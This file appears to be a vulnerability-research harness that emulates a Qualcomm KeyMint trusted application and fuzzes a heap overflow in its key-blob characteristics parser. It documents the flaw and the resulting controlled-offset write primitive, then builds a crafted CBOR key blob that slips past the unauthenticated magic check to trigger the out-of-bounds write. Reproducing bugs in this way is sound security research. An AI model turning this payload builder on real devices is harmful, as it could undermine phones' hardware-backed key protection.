from .params import *
from . import asan
from qiling import Qiling
import struct, os

# === KeyMint deserializeCharacteristics heap-overflow harness — GARNET =======
# Target: Qualcomm garnet KeyMint QTEE TA, keymint_garnet.ta
#   (sha 9d671549804a, 352344 B). Cross-device build-presence repro of the
#   Samsung S928B S22-1 bug (RE/triage/keymint_xdevice.md, "### garnet").
#
# BUG (re-derived on the garnet binary; VA = file_off - 0x1000):
# deserializeCharacteristics@0x292f8 parses a CBOR "characteristics" map out of a
# key blob and APPENDS each element's value into fixed-size in-struct arrays using
# an index field, with NO capacity check on 5 of its 6 append loops (the 6th,
# guarded sibling @0x296d8, DOES have `ldr x8,[x19,#0x120]; cmp x8,#4; b.hi
# 0x29924` -- the 5 vulnerable ones omit exactly that). The PURPOSE loop head
# @0x29550: count = ldrh w28,[sp,#0x10] (CBOR array len, capped 0xffff); array base
# = struct+0x18; index = [struct+0x30]; store @0x29584 `str w9,[x8,#0x18]` where
# x8 = struct + index*4. Capacity is 6 u32s @+0x18, and the index counter lives at
# struct+0x30, so element index 6 (0x18+6*4=0x30) overwrites the counter with the
# attacker value -> the next store indexes at struct+0x18 + value*4. With
# value >= 364 = (0x5c8-0x18)/4 the next store crosses the object end.
#
# VARIANT vs S928B: garnet's characteristics object is qsee_malloc(0x5c8)=1480
# (GET_KEY_CHARACTERISTICS@0x2cec4: `mov w0,#0x5c8` @0x2cf24; bl 0x161d4 qsee_malloc
# wrapper), NOT S928B's 0x5f0/1520. The struct layout offsets (+0x18 array, +0x30
# counter) are unchanged, so the controlled-offset primitive is identical; only the
# overflow threshold moves from 374 -> 364.
#
# The deserializer is reached via decodeKeyBlob@0x29b94 whose ONLY precondition is
# the *plaintext* magic gate @0x29c50: `ldr x4,[out_struct]; mov w8,#0x4b44; movk
# w8,#0x4b4d,lsl#16; cmp x4, 0x4b4d4b44 ("DKMK"); b.ne 0x29ca0 (decrypt/keyslot)` --
# i.e. NO AES-GCM decrypt / NO MAC verification precedes the overflow; the pre-gate
# calls (0x3c124/0x3cec4/0x3d280) are pure CBOR structural decode. Same unrenamed
# DKMK magic as S928B/peridot.
#
# STAGING MODEL (identical to the proven S928B keymint_dkmk harness): drive
# decodeKeyBlob@0x29b94 DIRECTLY:
#   decodeKeyBlob(x0=blob_ptr, x1=blob_len, x2=out_struct, w3=0)   [garnet ABI
#   confirmed: prologue x2->x19, x1->x0, x0->x1, x3->w20]
# - blob_ptr/blob_len -> a guest page holding the crafted CBOR key blob.
# - out_struct -> a REDZONED guest region of exactly 0x5c8 user bytes (mapped via
#   asan.install_param_redzones, the SAME [redzone][0x5c8][redzone] layout +
#   hardware write-hooks that qsee_malloc(0x5c8) installs), so the unbounded native
#   `str` that walks off the end of the 0x5c8 object hits the trailing redzone ->
#   invalid_region_write -> CRASH_PC. This faithfully reproduces the handler's
#   allocation; only the outer request-CBOR envelope (which merely extracts the
#   keyblob bstr and issues the literal qsee_malloc(0x5c8)) is bypassed -- not the
#   bug.

# Benign return target: the lifecycle gadget's `ret` @0xc390 is the json _end pivot,
# so a clean (non-overflowing) decodeKeyBlob return stops the emulation cleanly.
# The overflow is a heap write caught by the asan redzone write-hook BEFORE
# decodeKeyBlob ever returns, so a real benign _end is correct.
RET_GADGET        = 0xc390
DECODE_KEY_BLOB   = 0x29b94        # decodeKeyBlob(x0=ptr, x1=len, x2=out, w3=0)
OUT_USER_SIZE     = 0x5c8          # exact qsee_malloc size in the garnet handler

BLOB_BASE   = 0x51000000
BLOB_SIZE   = 0x40000              # plenty for a huge value-array
OUT_MINADDR = 0x52000000          # redzoned out_struct min-addr hint

# How many KeyParameter value-array elements to emit. Default forces the overflow.
DEFAULT_COUNT = int(os.environ.get("KM_COUNT", str(2000)), 0) & 0xFFFFFFFF

_OUT = {}
_BASE = {}


# ---- minimal CBOR encoder --------------------------------------------------
def _cbor_hdr(major, val):
    mt = major << 5
    if val < 24:
        return bytes([mt | val])
    elif val < 0x100:
        return bytes([mt | 24, val])
    elif val < 0x10000:
        return bytes([mt | 25]) + struct.pack(">H", val)
    elif val < 0x100000000:
        return bytes([mt | 26]) + struct.pack(">I", val)
    else:
        return bytes([mt | 27]) + struct.pack(">Q", val)

def cbor_uint(v):   return _cbor_hdr(0, v)
def cbor_nint(v):   return _cbor_hdr(1, -1 - v)
def cbor_bstr(b):   return _cbor_hdr(2, len(b)) + b
def cbor_tstr(s):   return _cbor_hdr(3, len(s.encode())) + s.encode()
def cbor_arr(n):    return _cbor_hdr(4, n)
def cbor_map(n):    return _cbor_hdr(5, n)
def cbor_int(v):    return cbor_uint(v) if v >= 0 else cbor_nint(v)

DKMK = 0x4b4d4b44   # "DKMK" word the gate compares ([out_struct]==this) @0x29c50

# KeyMint TAG_PURPOSE (ENUM_REP|1) -> the UNBOUNDED PURPOSE append loop (array
# @struct+0x18, cap 6 u32s, index @struct+0x30, store @0x29584). The tag classifier
# @0x29530 does `x8 = tag - 0x20000001; cmp x8,#5; b.hi skip` then a 6-entry jump
# table @0x481b4 (same scheme as S928B). We default to TAG_PURPOSE; override KM_TAG.
REP_TAG = int(os.environ.get("KM_TAG", str(0x20000001)), 0)

# The value written for each PURPOSE element. Default 364 = (0x5c8-0x18)/4, the exact
# index at which struct+0x18 + idx*4 reaches the end of the garnet 0x5c8 object.
# Element index 6 lands ON the counter at struct+0x30 (0x18+6*4=0x30), so the append
# overwrites its own counter with the attacker value -> the very next iteration
# indexes at struct+0x18 + value*4. With value >= 364 the next store crosses the
# 0x5c8 boundary -> heap OOB write (asan after-redzone hook -> CRASH_PC). value==364
# lands the OOB store at exactly obj+0x5c8; larger values reach further.
ELEM_VALUE = int(os.environ.get("KM_ELEM", "364"), 0) & 0xFFFFFFFF


def _build_charmap(count, elem=None):
    # The nested-CBOR characteristics envelope deserializeCharacteristics accepts:
    #   map{ 1: HW_map{ REP_TAG: array(count)[...] }, 0: SW_map{} }
    # (the outer map's int key is the HW/SW selector matched against the map-enter
    # w1; HW selector=1, SW selector=0). The HW_map's TAG_PURPOSE value-array drives
    # the unbounded PURPOSE append loop -> heap OOB.
    if elem is None:
        elem = ELEM_VALUE
    cm = bytearray()
    cm += cbor_map(2)                 # outer map { 1: HW, 0: SW }
    cm += cbor_uint(1)                # selector 1 -> HW-enforced enter (w1=1)
    cm += cbor_map(1)                 #   HW_map { REP_TAG : array(count) }
    cm += cbor_uint(REP_TAG)
    cm += cbor_arr(count)
    for _ in range(min(count, (BLOB_SIZE - 64) // 5)):
        cm += cbor_uint(elem)
    cm += cbor_uint(0)                # selector 0 -> SW-enforced enter (w1=0)
    cm += cbor_map(0)                 #   SW_map {} (empty)
    return bytes(cm)


def _build_blob(count):
    # Key-blob top-level CBOR ARRAY [magic, f1, f2, characteristics_bstr]:
    # decodeKeyBlob reads the leading field as out_struct[0] (must == "DKMK", gate
    # @0x29c50), then extracts the characteristics as a type-6 bstr and passes its
    # bytes to deserializeCharacteristics@0x292f8.
    charmap = _build_charmap(count)
    blob = bytearray()
    blob += cbor_arr(4)
    blob += cbor_uint(DKMK)              # field0 -> out_struct[0] == "DKMK"
    blob += cbor_uint(0)                 # field1
    blob += cbor_uint(0)                 # field2
    blob += cbor_bstr(charmap)           # characteristics (type-6 bstr)
    return bytes(blob)


def init_fuzz(emu, sid):
    ql = emu.ql
    try:
        ql.mem.map(BLOB_BASE, BLOB_SIZE, info="[km] blob")
    except Exception as e:
        ql.log.warning(f"[km] map blob: {e}")
    user, region, real = asan.install_param_redzones(ql, emu, b"\x00" * OUT_USER_SIZE,
                                                      OUT_USER_SIZE, OUT_MINADDR)
    _OUT["user"] = user
    _OUT["region"] = region
    _OUT["real"] = real
    try:
        base = ql.mem.get_lib_base("keymint_garnet.ta")
    except Exception:
        base = 0x555555554000
    _BASE["ret"] = base + RET_GADGET
    print(f"[km-garnet] init: base={hex(base)} ret_gadget@{hex(_BASE['ret'])} "
          f"blob@{hex(BLOB_BASE)} out_struct(user)@{hex(user)} "
          f"size={hex(OUT_USER_SIZE)} redzone_after@{hex(user + OUT_USER_SIZE)}")


def place_input_callback(ql: Qiling, input: bytes, _: int):
    count = DEFAULT_COUNT
    if "KM_COUNT" not in os.environ:
        v = struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else 0
        count = v % 8001    # wide range so AFL can cross the ~364 boundary

    raw = os.environ.get("KM_RAWBLOB", "")
    if raw:
        blob = bytes.fromhex(raw)
    elif "KM_RAWFUZZ" in os.environ:
        chars = input[:BLOB_SIZE - 64]
        blob = (cbor_arr(4) + cbor_uint(DKMK) + cbor_uint(0) + cbor_uint(0)
                + cbor_bstr(chars))
    else:
        blob = _build_blob(count)
    if len(blob) > BLOB_SIZE:
        blob = blob[:BLOB_SIZE]
    ql.mem.write(BLOB_BASE, blob)
    ql.mem.write(_OUT["user"], b"\x00" * OUT_USER_SIZE)

    setup_params_fuzz(ql, 0, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # decodeKeyBlob(x0=blob_ptr, x1=blob_len, x2=out_struct, w3=0)
    ql.arch.regs.x0 = BLOB_BASE
    ql.arch.regs.x1 = len(blob)
    ql.arch.regs.x2 = _OUT["user"]
    ql.arch.regs.x3 = 0
    ql.arch.regs.x30 = _BASE["ret"]

    print(f"[km-garnet] decodeKeyBlob(blob={len(blob)}B, out={hex(_OUT['user'])}, "
          f"value-array count={count}, elem={ELEM_VALUE}) tag={hex(REP_TAG)}")
    return True
